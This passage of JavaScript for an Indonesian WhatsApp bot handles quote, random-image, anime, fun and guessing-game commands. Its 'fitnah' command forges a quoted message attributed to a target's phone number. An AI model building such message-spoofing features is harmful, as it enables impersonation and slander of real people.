                    "“Cintailah seseorang karena Allah, bukan karena dunia, maka cintamu akan kekal selamanya.”",
                    "“Ketika dunia menjauhimu, jangan bersedih, karena Allah selalu dekat denganmu.”",
                    "“Sabar adalah kunci dari segala kesuksesan dalam kehidupan.”",
                    "“Orang yang paling mulia di sisi Allah adalah yang paling bertakwa.” (QS. Al-Hujurat: 13)",
                    "“Ketika kau kehilangan sesuatu, bersabarlah. Karena sesuatu yang lebih baik sedang menunggumu.”",
                    "“Jangan takut miskin karena sedekah, karena sedekah tidak mengurangi harta, justru melipatgandakannya.”",
                    "“Allah Maha Pengampun, maka janganlah berputus asa dari rahmat-Nya.”",
                    "“Jangan iri dengan rezeki orang lain, karena Allah memberikan apa yang terbaik bagimu.”",
                    "“Bersyukurlah dalam keadaan apapun, karena selalu ada hikmah di balik setiap kejadian.”"
                ];

                let randomQuote = quotes[Math.floor(Math.random() * quotes.length)]
                m.reply(`📖 *Quotes Islamic* 📖\n\n${randomQuote}`, {
                    quoted: fkontak1
                })
            }
            break

            case 'motivasi': {
                const hasil = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/kata-kata/motivasi.json');
                m.reply(pickRandom(hasil))
            }
            break
            case 'bijak': {
                const hasil = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/kata-kata/bijak.json');
                m.reply(pickRandom(hasil))
            }
            break
            case 'dare': {
                const hasil = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/kata-kata/dare.json');
                m.reply(pickRandom(hasil))
            }
            break
            case 'quotes': {
                const res = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/kata-kata/quotes.json');
                const hasil = pickRandom(res);
                m.reply(`_${hasil.quotes}_\n\n*- ${hasil.author}*`, {
                    quoted: fkontak1
                })
            }
            break
            case 'truth': {
                const hasil = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/kata-kata/truth.json');
                m.reply(`_${pickRandom(hasil)}_`, {
                    quoted: fkontak1
                })
            }
            break
            case 'renungan': {
                const hasil = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/kata-kata/renungan.json');
                Replyx('', {
                    contextInfo: {
                        forwardingScore: 10,
                        isForwarded: true,
                        externalAdReply: {
                            title: (m.pushName || 'Anonim'),
                            thumbnailUrl: pickRandom(hasil),
                            mediaType: 1,
                            previewType: 'PHOTO',
                            renderLargerThumbnail: true,
                        }
                    }
                }, {
                    quoted: fkontak1
                });
            }
            break
            case 'bucin': {
                const hasil = await fetchJson('https://raw.githubusercontent.com/Gxyenndev/database/refs/heads/master/kata-kata/bucin.json');
                m.reply(pickRandom(hasil))
            }
            break

            // Random Menu
            case 'kucing': {
            Replyx(mess.wait)
                try {
                    let anu = 'https://api.siputzx.my.id/api/r/cats';
                    await Xlesy.sendMessage(m.chat, {
                        image: {
                            url: anu
                        },
                        caption: mess.done,
                    }, {
                        quoted: fkontak1
                    });
                } catch (e) {
                    Replyx('Terjadi kesalahan saat mengambil gambar!', {
                        quoted: fkontak1
                    })
                }
            }
            break;
            Replyx(mess.wait)
            case 'cecantahiland': {
                try {
                    let anu = 'https://api.siputzx.my.id/api/r/cecan/thailand';
                    await Xlesy.sendMessage(m.chat, {
                        image: {
                            url: anu
                        },
                        caption: mess.done,
                    }, {
                        quoted: fkontak1
                    });
                } catch (e) {
                    Replyx('Terjadi kesalahan saat mengambil gambar!', {
                        quoted: fkontak1
                    })
                }
            }
            break;
            case 'cecanvietnam': {
            Replyx(mess.wait)
                try {
                    let anu = 'https://api.siputzx.my.id/api/r/cecan/vietnam';
                    await Xlesy.sendMessage(m.chat, {
                        image: {
                            url: anu
                        },
                        caption: mess.done,
                    }, {
                        quoted: fkontak1
                    });
                } catch (e) {
                    Replyx('Terjadi kesalahan saat mengambil gambar', {
                        quoted: fkontak1
                    })
                }
            }
            break;
            case 'cecankorea': {
            Replyx(mess.wait)
                try {
                    let anu = 'https://api.siputzx.my.id/api/r/cecan/korea';
                    await Xlesy.sendMessage(m.chat, {
                        image: {
                            url: anu
                        },
                        caption: mess.done,
                    }, {
                        quoted: fkontak1
                    });
                } catch (e) {
                    Replyx('Terjadi kesalahan saat mengambil gambar!', {
                        quoted: fkontak1
                    })
                }
            }
            break;
            case 'cecanjapan': {
            Replyx(mess.wait)
                try {
                    let anu = 'https://api.siputzx.my.id/api/r/cecan/japan';
                    await Xlesy.sendMessage(m.chat, {
                        image: {
                            url: anu
                        },
                        caption: mess.done,
                    }, {
                        quoted: fkontak1
                    });
                } catch (e) {
                    Replyx('Terjadi kesalahan saat mengambil gambar!', {
                        quoted: fkontak1
                    })
                }
            }
            break;
             case 'cecancina': {
             Replyx(mess.wait)
                try {
                    let anu = 'https://api.siputzx.my.id/api/r/cecan/china';
                    await Xlesy.sendMessage(m.chat, {
                        image: {
                            url: anu
                        },
                        caption: mess.done,
                    }, {
                        quoted: fkontak1
                    });
                } catch (e) {
                    Replyx('Terjadi kesalahan saat mengambil gambar!', {
                        quoted: fkontak1
                    })
                }
            }
            break;
            case 'cecanindo': {
            Replyx(mess.wait)
                try {
                    let anu = 'https://api.siputzx.my.id/api/r/cecan/indonesia';
                    await Xlesy.sendMessage(m.chat, {
                        image: {
                            url: anu
                        },
                        caption: mess.done,
                    }, {
                        quoted: fkontak1
                    });
                } catch (e) {
                    Replyx('terjadi keslhn saat saat mengambil gambar!', {
                        quoted: fkontak1
                    })
                }
            }
            break;
            case 'bluearchive': {
            Replyx(mess.wait)
                try {
                    let anu = 'https://api.siputzx.my.id/api/r/blue-archive';
                    await Xlesy.sendMessage(m.chat, {
                        image: {
                            url: anu
                        },
                        caption: mess.done,
                    }, {
                        quoted: fkontak1
                    });
                } catch (e) {
                    Replyx('Terjadi Kesalahn Saat Mengambil Gambar!', {
                        quoted: fkontak1
                    })
                }
            }
            break;
            case 'coffe':
            case 'kopi': {
            Replyx(mess.wait)
                await Xlesy.sendFileUrl(m.chat, 'https://coffee.alexflipnote.dev/random', mess.done, m, {
                    quoted: fkontak1
                })
            }
            break

            // Anime Menu    
               
            case 'waifu': {            
            Replyx(mess.wait)
                try {
                    if (text == 'nsfw') {
                        if (!isNsfw) return Replyx('Filter Nsfw Sedang Aktif!')
                        const res = await fetchJson('https://api.waifu.pics/nsfw/waifu')
                        await Xlesy.sendFileUrl(m.chat, res.url, 'Random Waifu', m)
                    } else {
                        const res = await fetchJson('https://api.waifu.pics/sfw/waifu')
                        await Xlesy.sendFileUrl(m.chat, res.url, 'Random Waifu', m)
                    }
                } catch (e) {
                    Replyx('Server sedang offline!', {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'neko': {
            Replyx(mess.wait)
                try {
                    if (text == 'nsfw') {
                        if (!isNsfw) return Replyx('Filter Nsfw Sedang Aktif!')
                        const res = await fetchJson('https://api.waifu.pics/nsfw/neko')
                        await Xlesy.sendFileUrl(m.chat, res.url, 'Random Waifu', m)
                    } else {
                        const res = await fetchJson('https://api.waifu.pics/sfw/neko')
                        await Xlesy.sendFileUrl(m.chat, res.url, 'Random Neko', m)
                    }
                } catch (e) {
                    Replyx('Server sedang offline!', {
                        quoted: fkontak1
                    })
                }
            }
            break

            // Fun Menu
            case 'dadu': {
                let ddsa = [{
                    url: 'https://telegra.ph/file/9f60e4cdbeb79fc6aff7a.png',
                    no: 1
                }, {
                    url: 'https://telegra.ph/file/797f86e444755282374ef.png',
                    no: 2
                }, {
                    url: 'https://telegra.ph/file/970d2a7656ada7c579b69.png',
                    no: 3
                }, {
                    url: 'https://telegra.ph/file/0470d295e00ebe789fb4d.png',
                    no: 4
                }, {
                    url: 'https://telegra.ph/file/a9d7332e7ba1d1d26a2be.png',
                    no: 5
                }, {
                    url: 'https://telegra.ph/file/99dcd999991a79f9ba0c0.png',
                    no: 6
                }]
                let media = pickRandom(ddsa)
                await Xlesy.sendAsSticker(m.chat, media.url, m, {
                    packname: packname,
                    author: author,
                    isAvatar: 1
                })
            }
            break
            case 'halah':
            case 'hilih':
            case 'huluh':
            case 'heleh':
            case 'holoh': {
                if (!m.quoted && !text) return Replyx(`Kirim/reply text dengan caption ${prefix + command}`, {
                    quoted: fkontak1
                })
                ter = command[1].toLowerCase()
                tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
                m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            }
            break
            case 'bisakah': {
                if (!text) return m.reply(`Example : ${prefix + command} saya menang?`, {
                    quoted: fkontak1
                })
                let bisa = ['Bisa', 'Coba Saja', 'Pasti Bisa', 'Mungkin Saja', 'Tidak Bisa', 'Tidak Mungkin', 'Coba Ulangi', 'Ngimpi kah?', 'yakin bisa?']
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                m.reply(`*Bisakah ${text}*\nJawab : ${keh}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'apakah': {
                if (!text) return m.reply(`Example : ${prefix + command} saya bisa menang?`, {
                    quoted: fkontak1
                })
                let apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Coba Ulangi', 'Mungkin Saja', 'Mungkin Tidak', 'Mungkin Iya', 'Ntahlah']
                let kah = apa[Math.floor(Math.random() * apa.length)]
                Replyx(`*${command} ${text}*\nJawab : ${kah}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'kapan':
            case 'kapankah': {
                if (!text) return m.reply(`Example : ${prefix + command} saya menang?`, {
                    quoted: fkontak1
                })
                let kapan = ['Besok', 'Lusa', 'Nanti', '4 Hari Lagi', '5 Hari Lagi', '6 Hari Lagi', '1 Minggu Lagi', '2 Minggu Lagi', '3 Minggu Lagi', '1 Bulan Lagi', '2 Bulan Lagi', '3 Bulan Lagi', '4 Bulan Lagi', '5 Bulan Lagi', '6 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', '6 Tahun Lagi', '1 Abad lagi', '3 Hari Lagi', 'Bulan Depan', 'Ntahlah', 'Tidak Akan Pernah']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                Replyx(`*${command} ${text}*\nJawab : ${koh}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'siapa':
            case 'siapakah': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!text) return m.reply(`Example : ${prefix + command} jawa?`, {
                    quoted: fkontak1
                })
                let member = (store.groupMetadata[m.chat] ? store.groupMetadata[m.chat].participants : m.metadata.participants).map(a => a.id)
                let siapakh = pickRandom(member)
                Replyx(`@${siapakh.split('@')[0]}`, {
                    quoted: fkontak1
                });
            }
            break
            case 'tanyakerang':
            case 'kerangajaib':
            case 'kerang': {
                if (!text) return m.reply(`Example : ${prefix + command} boleh pinjam 100?`, {
                    quoted: fkontak1
                })
                let krng = ['Mungkin suatu hari', 'Tidak juga', 'Tidak keduanya', 'Kurasa tidak', 'Ya', 'Tidak', 'Coba tanya lagi', 'Tidak ada']
                let jwb = pickRandom(krng)
                m.reply(`*Pertanyaan : ${text}*\n*Jawab : ${jwb}*`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cekmati': {
                if (!text) return m.reply(`Example : ${prefix + command} nama lu`, {
                    quoted: fkontak1
                })
                let teksnya = text.replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, '').replace(/\d/g, '');
                let {
                    data
                } = await axios.get(`https://api.agify.io/?name=${teksnya ? teksnya : 'bot'}`, {
                    quoted: fkontak1
                });
                m.reply(`Nama : ${text}\n*Mati Pada Umur :* ${data.age == null ? (Math.floor(Math.random() * 90) + 20) : data.age} Tahun.\n\n_Cepet Cepet Tobat Bro_\n_Soalnya Mati ga ada yang tau_`, {
                    quoted: fkontak1
                })
            }
            break
            case 'ceksifat': {
                let sifat_a = ['Bijak', 'Sabar', 'Kreatif', 'Humoris', 'Mudah bergaul', 'Mandiri', 'Setia', 'Jujur', 'Dermawan', 'Idealis', 'Adil', 'Sopan', 'Tekun', 'Rajin', 'Pemaaf', 'Murah hati', 'Ceria', 'Percaya diri', 'Penyayang', 'Disiplin', 'Optimis', 'Berani', 'Bersyukur', 'Bertanggung jawab', 'Bisa diandalkan', 'Tenang', 'Kalem', 'Logis']
                let sifat_b = ['Sombong', 'Minder', 'Pendendam', 'Sensitif', 'Perfeksionis', 'Caper', 'Pelit', 'Egois', 'Pesimis', 'Penyendiri', 'Manipulatif', 'Labil', 'Penakut', 'Vulgar', 'Tidak setia', 'Pemalas', 'Kasar', 'Rumit', 'Boros', 'Keras kepala', 'Tidak bijak', 'Pembelot', 'Serakah', 'Tamak', 'Penggosip', 'Rasis', 'Ceroboh', 'Intoleran']
                let teks = `╭──┈➤「 *Cek Sifat* 」❍\n│• Sifat ${text && m.mentionedJid ? text : '@' + m.sender.split('@')[0]}${(text && m.mentionedJid ? '' : (`\n│• Nama : *${text ? text : m.pushName}*` || '\n│• Nama : *Tanpa Nama*'))}\n│• Orang yang : *${pickRandom(sifat_a)}*\n│• Kekurangan : *${pickRandom(sifat_b)}*\n│• Keberanian : *${Math.floor(Math.random() * 100)}%*\n│• Kepedulian : *${Math.floor(Math.random() * 100)}%*\n│• Kecemasan : *${Math.floor(Math.random() * 100)}%*\n│• Ketakutan : *${Math.floor(Math.random() * 100)}%*\n│• Akhlak Baik : *${Math.floor(Math.random() * 100)}%*\n│• Akhlak Buruk : *${Math.floor(Math.random() * 100)}%*\n╰──────┈➤`
                m.reply(teks, {
                    quoted: fkontak1
                })
            }
            break
            case 'cekkhodam': {
                if (!text) return m.reply(`Example : ${prefix + command} nama lu`, {
                    quoted: fkontak1
                })
                try {
                    const res = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/random/cekkhodam.json');
                    const hasil = pickRandom(res);
                    m.reply(`Khodam dari *${text}* adalah *${hasil.nama}*\n_${hasil.deskripsi}_`, {
                        quoted: fkontak1
                    })
                } catch (e) {
                    m.reply(pickRandom(['Dokter Indosiar', 'Sigit Rendang', 'Ustadz Sinetron', 'Bocil epep']), {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'rate':
            case 'nilai': {
                m.reply(`Rate Bot : *${Math.floor(Math.random() * 100)}%*`, {
                    quoted: fkontak1
                })
            }
            break
            case 'jodohku': {
                if (!m.isGroup) return m.reply(mess.group)
                let member = (store.groupMetadata[m.chat] ? store.groupMetadata[m.chat].participants : m.metadata.participants).map(a => a.id)
                let jodoh = pickRandom(member)
                m.reply(`👫Jodoh mu adalah\n@${m.sender.split('@')[0]} ❤ @${jodoh.split('@')[0]}`, {
                    quoted: fkontak1
                });
            }
            break
            case 'jadian': {
                if (!m.isGroup) return m.reply(mess.group)
                let member = (store.groupMetadata[m.chat] ? store.groupMetadata[m.chat].participants : m.metadata.participants).map(a => a.id)
                let jadian1 = pickRandom(member)
                let jadian2 = pickRandom(member)
                m.reply(`Ciee yang Jadian💖 Jangan lupa Donasi🗿\n@${jadian1.split('@')[0]} ❤ @${jadian2.split('@')[0]}`, {
                    quoted: fkontak1
                });
            }
            break
            case 'fitnah': {
                let [teks1, teks2, teks3] = text.split`|`
                if (!teks1 || !teks2 || !teks3) return m.reply(`Example : ${prefix + command} pesan target|pesan mu|nomer/tag target`, {
                    quoted: fkontak1
                })
                let ftelo = {
                    key: {
                        fromMe: false,
                        participant: teks3.replace(/[^0-9]/g, '') + '@s.whatsapp.net',
                        ...(m.isGroup ? {
                            remoteJid: m.chat
                        } : {
                            remoteJid: teks3.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                        })
                    },
                    message: {
                        conversation: teks1
                    }
                }
                Xlesy.sendMessage(m.chat, {
                    text: teks2
                }, {
                    quoted: ftelo
                });
            }
            break

            // Game Menu
            case 'slot': {
                await gameSlot(Xlesy, m, db)
            }
            break
            case 'casino': {
                await gameCasinoSolo(Xlesy, m, prefix, db)
            }
            break
            case 'rampok':
            case 'merampok': {
                await gameMerampok(m, db)
            }
            break
            case 'begal': {
                await gameBegal(Xlesy, m, db)
            }
            break
            case 'suitpvp':
            case 'suit': {
                let poin = 10
                let poin_lose = 10
                let timeout = 60000
                if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`, {
                    quoted: fkontak1
                })
                if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`, {
                    quoted: fkontak1
                })
                if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[0]}`, m.chat, {
                    mentions: [owner[1] + '@s.whatsapp.net']
                }, {
                    quoted: fkontak1
                })
                if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return m.reply(`Orang yang kamu tantang sedang bermain suit bersama orang lain :(`, {
                    quoted: fkontak1
                })
                let id = 'suit_' + new Date() * 1
                let caption = `_*SUIT PvP*_\n\n@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit\n\nSilahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
                suit[id] = {
                    //tanda1
                    chat: m.reply(caption, {
                        quoted: fkontak1
                    }),
                    id: id,
                    p: m.sender,
                    p2: m.mentionedJid[0],
                    status: 'wait',
                    waktu: setTimeout(() => {
                        if (suit[id]) m.reply(`_Waktu suit habis_`, {
                            quoted: fkontak1
                        })
                        delete suit[id]
                    }, 60000),
                    poin,
                    poin_lose,
                    timeout
                }
            }
            break
            case 'ttc':
            case 'ttt':
            case 'tictactoe': {
                let TicTacToe = require('./lib/tictactoe');
                if (Object.values(tictactoe).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply(`Kamu masih didalam game!\nKetik *${prefix}del${command}* Jika Ingin Mengakhiri sesi`, {
                    quoted: fkontak1
                });
                let room = Object.values(tictactoe).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                if (room) {
                    Replyx('Partner ditemukan!', {
                        quoted: fkontak1
                    })
                    room.o = m.chat
                    room.game.playerO = m.sender
                    room.state = 'PLAYING'
                    let arr = room.game.render().map(v => {
                        return {
                            X: '❌',
                            O: '⭕',
                            1: '1️⃣',
                            2: '2️⃣',
                            3: '3️⃣',
                            4: '4️⃣',
                            5: '5️⃣',
                            6: '6️⃣',
                            7: '7️⃣',
                            8: '8️⃣',
                            9: '9️⃣'
                        } [v]
                    })
                    let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\nMenunggu @${room.game.currentTurn.split('@')[0]}\n\nKetik *nyerah* untuk menyerah dan mengakui kekalahan`
                    if (room.x !== room.o) await Xlesy.sendMessage(room.x, {
                        texr: str,
                        mentions: parseMention(str)
                    }, {
                        quoted: fkontak1
                    })
                    await Xlesy.sendMessage(room.o, {
                        text: str,
                        mentions: parseMention(str)
                    }, {
                        quoted: fkontak1
                    })
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING',
                        waktu: setTimeout(() => {
                            if (tictactoe[roomnya.id]) m.reply(`_Waktu ${command} habis_`, {
                                quoted: fkontak1
                            })
                            delete tictactoe[roomnya.id]
                        }, 300000)
                    }
                    if (text) room.name = text
                    Xlesy.sendMessage(m.chat, {
                        text: 'Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''),
                        mentions: m.mentionedJid
                    }, {
                        quoted: fkontak1
                    })
                    tictactoe[room.id] = room
                }
            }
            break
            case 'akinator': {
                if (text == 'start') {
                    if (akinator[m.sender]) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                    akinator[m.sender] = new Akinator({
                        region: 'id',
                        childMode: false
                    });
                    await akinator[m.sender].start()
                    let {
                        key
                    } = await m.reply(`🎮 Akinator Game :\n\n@${m.sender.split('@')[0]}\n${akinator[m.sender].question}\n\n- 0 - Ya\n- 1 - Tidak\n- 2 - Tidak Tau\n- 3 - Mungkin\n- 4 - Mungkin Tidak\n\n${prefix + command} end (Untuk Keluar dari sesi)`, {
                        quoted: fkontak1
                    })
                    akinator[m.sender].key = key.id
                    akinator[m.sender].waktu = setTimeout(() => {
                        if (akinator[m.sender]) m.reply(`_Waktu ${command} habis_`, {
                            quoted: fkontak1
                        })
                        delete akinator[m.sender];
                    }, 3600000)
                } else if (text == 'end') {
                    if (!akinator[m.sender]) return Replyx('Kamu tidak Sedang bermain Akinator!')
                    delete akinator[m.sender];
                    Replyx('Sukses Mengakhiri sessi Akinator')
                } else m.reply(`Example : ${prefix + command} start/end`, {
                    quoted: fkontak1
                })
            }
            break
            case 'tebakbom': {
                if (tebakbom[m.sender]) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                tebakbom[m.sender] = {
                    petak: [0, 0, 0, 2, 0, 2, 0, 2, 0, 0].sort(() => Math.random() - 0.5),
                    board: ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟'],
                    bomb: 3,
                    lolos: 7,
                    pick: 0,
                    nyawa: ['❤️', '❤️', '❤️'],
                    waktu: setTimeout(() => {
                        if (tebakbom[m.sender]) m.reply(`_Waktu ${command} habis_`, {
                            quoted: fkontak1
                        })
                        delete tebakbom[m.sender];
                    }, 120000)
                }
                m.reply(`*TEBAK BOM*\n\n${tebakbom[m.sender].board.join("")}\n\nPilih lah nomor tersebut! dan jangan sampai terkena Bom!\nBomb : ${tebakbom[m.sender].bomb}\nNyawa : ${tebakbom[m.sender].nyawa.join("")}`, {
                    quoted: fkontak1
                });
            }
            break
            case 'tekateki': {
                if (iGame(tekateki, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tekateki.json');
                const hasil = pickRandom(soal);
                let {
                    key
                } = await m.reply(`🎮 Teka Teki Berikut :\n\n${hasil.soal}\n\nWaktu : 60s\nHadiah *+3499*`, {
                    quoted: fkontak1
                })
                tekateki[m.chat + key.id] = {
                    jawaban: hasil.jawaban.toLowerCase(),
                    id: key.id
                }
                await sleep(60000)
                if (rdGame(tekateki, m.chat, key.id)) {
                    Replyx('Waktu Habis\nJawaban: ' + tekateki[m.chat + key.id].jawaban)
                    delete tekateki[m.chat + key.id]
                }
            }
            break
            case 'tebaklirik': {
                if (iGame(tebaklirik, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebaklirik.json');
                const hasil = pickRandom(soal);
                let {
                    key
                } = await m.reply(`🎮 Tebak Lirik Berikut :\n\n${hasil.soal}\n\nWaktu : 90s\nHadiah *+4299*`, {
                    quoted: fkontak1
                })
                tebaklirik[m.chat + key.id] = {
                    jawaban: hasil.jawaban.toLowerCase(),
                    id: key.id
                }
                await sleep(90000)
                if (rdGame(tebaklirik, m.chat, key.id)) {
                    Replyx('Waktu Habis\nJawaban: ' + tebaklirik[m.chat + key.id].jawaban)
                    delete tebaklirik[m.chat + key.id]
                }
            }
            break
            case 'tebakkata': {
                if (iGame(tebakkata, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebakkata.json');
                const hasil = pickRandom(soal);
                let {
                    key
                } = await m.reply(`🎮 Tebak Kata Berikut :\n\n${hasil.soal}\n\nWaktu : 60s\nHadiah *+3499*`, {
                    quoted: fkontak1
                })
                tebakkata[m.chat + key.id] = {
                    jawaban: hasil.jawaban.toLowerCase(),
                    id: key.id
                }
                await sleep(60000)
                if (rdGame(tebakkata, m.chat, key.id)) {
                    Replyx('Waktu Habis\nJawaban: ' + tebakkata[m.chat + key.id].jawaban)
                    delete tebakkata[m.chat + key.id]
                }
            }
            break
            case 'family100': {
                if (family100.hasOwnProperty(m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/family100.json');
                const hasil = pickRandom(soal);
                let {
                    key
                } = await m.reply(`🎮 Tebak Kata Berikut :\n\n${hasil.soal}\n\nWaktu : 5m\nHadiah *+3499*`, {
                    quoted: fkontak1
                })
                family100[m.chat] = {
                    soal: hasil.soal,
                    jawaban: hasil.jawaban,
                    terjawab: Array.from(hasil.jawaban, () => false),
                    id: key.id
                }
                await sleep(300000)
                if (family100.hasOwnProperty(m.chat)) {
                    Replyx('Waktu Habis\nJawaban:\n- ' + family100[m.chat].jawaban.join('\n- '))
                    delete family100[m.chat]
                }
            }
            break
            case 'susunkata': {
                if (iGame(susunkata, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/susunkata.json');
                const hasil = pickRandom(soal);
                let {
                    key
                } = await m.reply(`🎮 Susun Kata Berikut :\n\n${hasil.soal}\nTipe : ${hasil.tipe}\n\nWaktu : 60s\nHadiah *+2989*`, {
                    quoted: fkontak1
                })
                susunkata[m.chat + key.id] = {
                    jawaban: hasil.jawaban.toLowerCase(),
                    id: key.id
                }
                await sleep(60000)
                if (rdGame(susunkata, m.chat, key.id)) {
                    Replyx('Waktu Habis\nJawaban: ' + susunkata[m.chat + key.id].jawaban)
                    delete susunkata[m.chat + key.id]
                }
            }
            break
            case 'tebakkimia': {
                if (iGame(tebakkimia, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebakkimia.json');
                const hasil = pickRandom(soal);
                let {
                    key
                } = await m.reply(`🎮 Tebak Kimia Berikut :\n\n${hasil.unsur}\n\nWaktu : 60s\nHadiah *+3499*`, {
                    quoted: fkontak1
                })
                tebakkimia[m.chat + key.id] = {
                    jawaban: hasil.lambang.toLowerCase(),
                    id: key.id
                }
                await sleep(60000)
                if (rdGame(tebakkimia, m.chat, key.id)) {
                    Replyx('Waktu Habis\nJawaban: ' + tebakkimia[m.chat + key.id].jawaban)
                    delete tebakkimia[m.chat + key.id]
                }
            }
            break
            case 'caklontong': {
                if (iGame(caklontong, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/caklontong.json');
                const hasil = pickRandom(soal);
                let {
                    key
                } = await m.reply(`🎮 Jawab Pertanyaan Berikut :\n\n${hasil.soal}\n\nWaktu : 60s\nHadiah *+9999*`, {
                    quoted: fkontak1
                })
                caklontong[m.chat + key.id] = {
                    ...hasil,
                    jawaban: hasil.jawaban.toLowerCase(),
                    id: key.id
                }
                await sleep(60000)
                if (rdGame(caklontong, m.chat, key.id)) {
                    m.reply(`Waktu Habis\nJawaban: ${caklontong[m.chat + key.id].jawaban}\n"${caklontong[m.chat + key.id].deskripsi}"`, {
                        quoted: fkontak1
                    })
                    delete caklontong[m.chat + key.id]
                }
            }
            break
            case 'tebaknegara': {
                if (iGame(tebaknegara, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebaknegara.json');
                const hasil = pickRandom(soal);
                let {
                    key
                } = await m.reply(`🎮 Tebak Negara Dari Tempat Berikut :\n\n*Tempat : ${hasil.tempat}*\n\nWaktu : 60s\nHadiah *+3499*`, {
                    quoted: fkontak1
                })
                tebaknegara[m.chat + key.id] = {
                    jawaban: hasil.negara.toLowerCase(),
                    id: key.id
                }
                await sleep(60000)
                if (rdGame(tebaknegara, m.chat, key.id)) {
                    Replyx('Waktu Habis\nJawaban: ' + tebaknegara[m.chat + key.id].jawaban)
                    delete tebaknegara[m.chat + key.id]
                }
            }
            break
            case 'tebakgambar': {
                if (iGame(tebakgambar, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebakgambar.json');
                const hasil = pickRandom(soal);
                let {
                    key
                } = await Xlesy.sendFileUrl(m.chat, hasil.img, `🎮 Tebak Gambar Berikut :\n\n${hasil.deskripsi}\n\nWaktu : 60s\nHadiah *+3499*`, m)
                tebakgambar[m.chat + key.id] = {
                    jawaban: hasil.jawaban.toLowerCase(),
                    id: key.id
                }
                await sleep(60000)
                if (rdGame(tebakgambar, m.chat, key.id)) {
                    Replyx('Waktu Habis\nJawaban: ' + tebakgambar[m.chat + key.id].jawaban)
                    delete tebakgambar[m.chat + key.id]
                }
            }
            break
            case 'tebakbendera': {
                if (iGame(tebakbendera, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebakbendera.json');
                const hasil = pickRandom(soal);
                let {
                    key
                } = await m.reply(`🎮 Tebak Bendera Berikut :\n\n*Bendera : ${hasil.bendera}*\n\nWaktu : 60s\nHadiah *+3499*`, {
                    quoted: fkontak1
                })
                tebakbendera[m.chat + key.id] = {
                    jawaban: hasil.negara.toLowerCase(),
                    id: key.id
                }
                await sleep(60000)
                if (rdGame(tebakbendera, m.chat, key.id)) {
                    Replyx('Waktu Habis\nJawaban: ' + tebakbendera[m.chat + key.id].jawaban)
                    delete tebakbendera[m.chat + key.id]
                }
